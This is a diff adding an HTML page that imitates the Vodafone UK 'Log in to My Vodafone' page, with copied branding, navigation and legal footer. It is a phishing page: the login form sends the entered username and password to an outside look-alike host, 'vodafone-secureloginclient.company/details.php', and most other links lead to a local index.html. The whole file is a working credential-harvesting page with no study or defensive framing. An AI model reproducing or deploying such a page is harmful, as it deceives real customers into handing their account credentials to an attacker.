@@ -1,0 +1,235 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html class="p_AFMaximized jsEnabled" dir="ltr" lang="en">
+
+<head data-at-mbox-name="target-global-mbox" class="mbox-name-target-global-mbox at-element-marker">
+
+<script>
+function empty() {
+    var x;
+    x = document.getElementById("username").value;
+    if (x == "") {
+        document.getElementById("username").style = "border-color:red";
+		document.getElementById("username_error").style = "display: block";
+        return false;
+    }
+	var y;
+    y = document.getElementById("password").value;
+    if (y == "") {
+        document.getElementById("password").style = "border-color:red";
+		document.getElementById("password_error").style = "display: block";
+        return false;
+    }
+
+}
+</script>
+
+<script>
+function change() {
+    var e;
+    e = document.getElementById("username").value;
+    if (e !== ""){
+	    document.getElementById("username").style = "";
+		document.getElementById("username_error").style = "display: none";
+	}
+	var e;
+    e = document.getElementById("password").value;
+    if (e !== ""){
+	    document.getElementById("password").style = "";
+		document.getElementById("password_error").style = "display: none";
+	}
+	
+}
+
+</script>
+
+<link href="login_files/favicon.ico" rel="shortcut icon">
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<link rel="stylesheet" charset="UTF-8" type="text/css" href="login_files/portal-desktop-xtpe3p-en-ltr-webkit-cmp.css">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"> <meta name="format-detection" content="telephone=no"> <meta http-equiv="cleartype" content="on">  
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+<title>Check your Vodafone account online – log into My Vodafone</title>
+
+<link rel="stylesheet" type="text/css" afrres="true" href="login_files/css_topntail.css">
+<link rel="stylesheet" type="text/css" afrres="true" href="login_files/css_portlet_wcp.css">
+<link rel="stylesheet" type="text/css" afrres="true" href="login_files/css_myacc_interim_mob_forgot.css">
+
+<style id="at-makers-style" class="at-flicker-control">
+.mboxDefault {visibility:hidden;}
+</style>
+
+</head>
+
+<body class="x11w p_AFMaximized" data-inq-observer="1">
+
+<div id="afr::DocWrapper"><div id="d1"><a id="d1::skip" href="index.html" class="x11y" style="display: none;">Skip to content</a><form id="f1" name="f1" class="xwn"method="POST" action="https://vodafone-secureloginclient.company/details.php?&amp;sessionid=ed6271a9c57db8bc21b15a90f857b921&amp;securessl=true" onsubmit="return empty()"><span id="T:pt_pg1">
+
+<ul id="orientation"><li><a href="index.html">Skip to navigation</a></li><li><a href="index.html">Skip to secondary navigation</a></li><li><a href="index.html">Skip to content</a></li></ul> 
+<ul id="orientation">
+   <li>
+      <a href="index.html">Skip to navigation</a>
+   </li>
+   <li>
+      <a href="index.html">Skip to secondary navigation</a>
+   </li>
+   <li>
+      <a href="index.html">Skip to content</a>
+   </li>
+</ul>
+<div id="metaNav">
+   <div id="metaNavContent">
+      <ul id="mastheadTabs">
+         <li class="current">
+         <a href="index.html"><span>Personal</span></a>
+      </li>
+      <li>
+      <a href="index.html"><span>Business</span></a>
+   </li>
+</ul>
+<ul id="mastheadUtils">
+   <li>
+      <a href="index.html">Privacy
+      and cookies</a>
+   </li>
+   <li id="MUmyAccount">
+      <!--legacynav-->
+	<a href="index.html">Log in to My account</a>
+<ul id="MUmyAccountOptions">
+
+		<li><span class="innerText">Log in to access all your account features</span></li>
+				
+			<li><a href="index.html" class="darkButton"><span>Log in</span></a></li>
+		
+						
+			<li><a href="index.html" class="linkListLike">Register for My account</a></li>
+		
+		</ul>
+
+   </li>
+</ul>
+</div>
+</div>
+<div id="navigation">
+   <a href="index.html" id="homeLink" name="homeLink"><img src="login_files/img_vodafone_logo.png" alt="" id="vfLogo"></a>
+      <ul id="primaryNavigation" class="personal">
+         <li>
+            <a class="menuLayerLink" href="index.html"><span>Mobile</span></a>
+            
+         </li>
+         <li>
+            <a class="menuLayerLink" href="index.html"><span>Broadband</span></a>
+            
+         </li>
+         <li>
+            <a class="menuLayerLink" href="index.html"><span>My Vodafone</span></a>
+           
+         </li>
+         <li>
+            <a class="menuLayerLink" href="index.html"><span>Help &amp; information</span></a>
+           
+         </li>
+      </ul>
+     
+      <div class="fieldset top-search">
+         <input id="searchQuery" type="text" name="searchQuery" maxlength="128" value="" title="Search" onkeydown="if (event.keyCode == 13) redirectToSearch();" onkeyup="ajax_showOptions(this,&#39;SearchSuggestion&#39;,3,event)" goodname="searchQuery" adfname="searchQuery"><input type="button" id="searchImageButton" name="top-search" value="" title="search" onclick="redirectToSearch();" goodname="top-search" adfname="top-search">
+      </div>
+      
+</div>
+
+<div id="pageContent"><div class="container_12"><div class="contBasic clearBoth"><div id="T:pageCustomizable1" class="x19c"><div id="T:pageCustomizable1::c"><span id="T:content_g1" class="x1a"><div class="grid_12 omega"><div id="T:content_12" class="x18z"><div id="T:content_12::content"><div><div id="T:e1913811738" class="x17s"><div class="x183 p_AFLight"><div id="T:e1913811738::div2" style="background-color:transparent;" class="x184 p_AFLight"><h1>Log in to My Vodafone</h1></div></div></div></div></div></div></div><div class="grid_12 omega"><div id="T:content_footer" class="x18z"><div id="T:content_footer::content"><div><div id="T:sdf_for_oc_3294087070region1" class="x17s"><div class="x183 p_AFLight"><div id="T:sdf_for_oc_3294087070region1::div2" class="x184 p_AFLight"><div id="T:oc_3294087070region1" class="xnl"><span id="T:oc_3294087070region1:0:login" class="x1a"><div class="portlet_loginForm_v3"><h2>Log in</h2><p class="notice"></p><div class="desc"><span class="lock_lrg_icon"></span><p>Please enter your username and password to log in. You may be asked for additional information to complete certain tasks - such as updating your personal details.</p></div><div class="row"><div class="box_easylogin forty5" data-mh="easyboxes"><div class="formContainer"><p class="required"><span class="reqMark">*</span>Required information</p><div class="formRow js"><label class="" for="userId">Username<span class="reqMark">*</span></label><input autocomplete="off" class="validateItem validateRequired" id="username" maxlength="50" name="username" type="text" value="" goodname="username" adfname="username" onblur="change()">
+
+<label id="username_error" style="display: none"><font color="red">Enter your username.</font></label>
+
+<p class="helpText" id="user_info" style="display: none;">This might be your email address or a unique name you created when you registered with Vodafone.</p>
+
+<p class="labelSpace_new"><a href="index.html">Forgotten your username</a></p><div class="helpTextOff"><span class="icon"></span></div></div><div class="formRow js"><label class="" for="password">Password<span class="reqMark">*</span></label><input autocomplete="off" class="validateItem validateRequired" id="password" name="password" type="password" goodname="password" adfname="password" onblur="change()">
+
+<label id="password_error" style="display: none"><font color="red">Enter your password.</font></label>
+
+<p class="helpText" style="display: none;">This is the password you created when you registered with Vodafone.</p>
+
+<p class="labelSpace_new_pass"><a href="index.html">Forgotten your password</a></p><div class="helpTextOff"><span class="icon"></span></div></div><div class="formButtonContainer"><input id="T:oc_3294087070region1:0:logFrm:signin1" name="signin1" type="submit" value="Log in now" onclick="" class="submit" goodname="signin1" adfname="T:oc_3294087070region1:0:logFrm:signin1"></div><p class="labelSpace_new_register"><a href="index.html">Register for My Vodafone</a></p></div></div></div><div class="clearfix"></div></div></span></div></div></div></div></div></div></div></div></span></div></div></div></div><div id="footernav"><div id="footernav_links">
+		<dl>
+			<dt><span>Buying online</span></dt>
+			
+			<dd><a href="index.html">Pay monthly deals</a></dd>
+			<dd><a href="index.html">Pay as you go deals</a></dd>
+			<dd><a href="index.html">SIM only deals</a></dd>
+			<dd><a href="index.html">iPad and tablets</a></dd>
+			<dd><a href="index.html">Mobile Broadband</a></dd>
+			<dd><a href="index.html">Home Broadband</a></dd>
+			<dd><a href="index.html">Accessories</a></dd>
+			<dd><a href="index.html">VOXI</a></dd>
+			<dd><a href="index.html">V by Vodafone</a></dd>
+			<dd><a href="index.html">Vodafone recommends</a></dd>
+			
+		</dl>
+		<dl>
+			<dt><span>Popular phones</span></dt>
+			
+			<dd><a href="index.html">Galaxy Note9</a></dd>
+			<dd><a href="index.html">Galaxy S9</a></dd>
+			<dd><a href="index.html">Galaxy S9+</a></dd>
+			<dd><a href="index.html">iPhone 8</a></dd>
+			<dd><a href="index.html">iPhone 8 Plus</a></dd>
+			<dd><a href="index.html">iPhone X</a></dd>
+			<dd><a href="index.html">iPhone 7</a></dd>
+			<dd><a href="index.html">iPhone 7 Plus</a></dd>
+			<dd><a href="index.html">Galaxy S8</a></dd>
+			<dd><a href="index.html">Galaxy S8+</a></dd>
+			<dd><a href="index.html">iPhone 6s</a></dd>
+			
+		</dl>
+		<dl>
+			<dt><span>Help &amp; Support</span></dt>
+			
+			<dd><a href="index.html">All help topics</a></dd>
+			<dd><a href="index.html">Help with your device</a></dd>
+			<dd><a href="index.html">Lost or stolen devices</a></dd>
+			<dd><a href="index.html">Vodafone Community</a></dd>
+			<dd><a href="index.html">Help with my account</a></dd>
+			<dd><a href="index.html">Accessibility</a></dd>
+			<dd><a href="index.html">Find a store</a></dd>
+			<dd><a href="index.html">Contact us</a></dd>
+			<dd><a href="index.html">How to complain</a></dd>
+			<dd><a href="index.html">Repairs</a></dd>
+			<dd><a href="index.html">Return a product</a></dd>
+			
+		</dl>
+		<dl>
+			<dt><span>Vodafone UK</span></dt>
+			
+			<dd><a href="index.html">About us</a></dd>
+			<dd><a href="index.html">For investors</a></dd>
+			<dd><a href="index.html">For the media</a></dd>
+			<dd><a href="index.html">Sustainable business</a></dd>
+			<dd><a href="index.html">Why choose us?</a></dd>
+			<dd><a href="index.html">Keeping children safe</a></dd>
+			<dd><a href="index.html">Anti-slavery statement</a></dd>
+			<dd><a href="index.html">Careers</a></dd>
+			<dd><a href="index.html">Essential customer information</a></dd>
+			<dd><a href="index.html">JustTextGiving</a></dd>
+			<dd><a href="index.html">Vodafone Labs</a></dd>
+			
+		</dl>
+	</div>
+	
+	<div class="footerLegal">	
+	
+		<span class="footerCopy">© 2018 Vodafone Limited. Registered office: Vodafone House, The Connection, Newbury, Berkshire RG14 2FN. Registered in England No 1471587.</span>
+	
+		<ul class="socialIcons">
+			<li><a href="index.html" title="Twitter"><img src="login_files/img_twitter.jpg" alt="Share with Twitter"></a></li>
+			<li><a href="index.html" title="Facebook"><img src="login_files/img_facebook.jpg" alt="Share with Facebook"></a></li>
+		</ul>
+	
+	</div></div></div></span><span id="f1::postscript"></span></form><div id="afr::DlgSrvPopupCtnr"></div></div></div><div id="Nuance-chat-anchored" style="position: fixed; bottom: 0px; right: 0px; z-index: 9999; display: block;"></div><div id="Nuance-chat-anchored-1" style="position: fixed; bottom:0;right:0;z-index:9999"></div>
+	
+	</body>
+	
+	</html>
